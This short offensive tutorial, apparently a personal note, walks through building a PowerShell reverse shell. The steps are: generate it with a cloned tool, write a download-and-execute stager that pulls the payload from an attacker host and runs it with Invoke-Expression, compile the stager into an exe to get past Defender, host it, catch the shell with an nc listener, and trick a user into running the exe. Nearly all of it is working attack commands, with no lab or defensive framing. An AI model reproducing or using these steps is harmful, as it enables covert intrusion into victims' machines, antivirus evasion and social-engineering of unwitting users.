Reverse shell code.
```Shell
git clone https://github.com/gh0x0st/Get-ReverseShell.git
```

Open PowerShell note pwsh is Linux PowerShell.  
```Powershell
pwsh 
import-module ./get-reverseshell.ps1
Get-ReverseShell -ip x.x.x.x -Port xxxx
```

Copy the generated code.

```Shell
nano payload.ps1
```

paste in code and save

But Defender will still pick up this script as malicious. 
So we will create a second script and turn it into a exe that will download our payload.

```Shell
scripturl = "http://<ip address of attack box>/payload.ps1"
scriptbytes = Invoke-WebRequest -Uri $scripturl -UseBasicParsing -method Get -MaximumRedirection 0
scriptcontent = [System.Text.Encoding]::UTF8.GetString($scriptbytes.content)
Invoke-Expression -Command $scriptcontent
```

Create exe from powershell. 
This must be done in a windows machine.

```PowerShell
Install-Module -Name ps2exe
win-ps2exe
```

Fill in GUI form and save exe.
Copy exe back to Kali
Upload exe to target.
```Shell
python -m http.server
```

Create a listner.
```Shell
nc -nvlp <portnumber>
```

Social Engineer a user into running the exe.
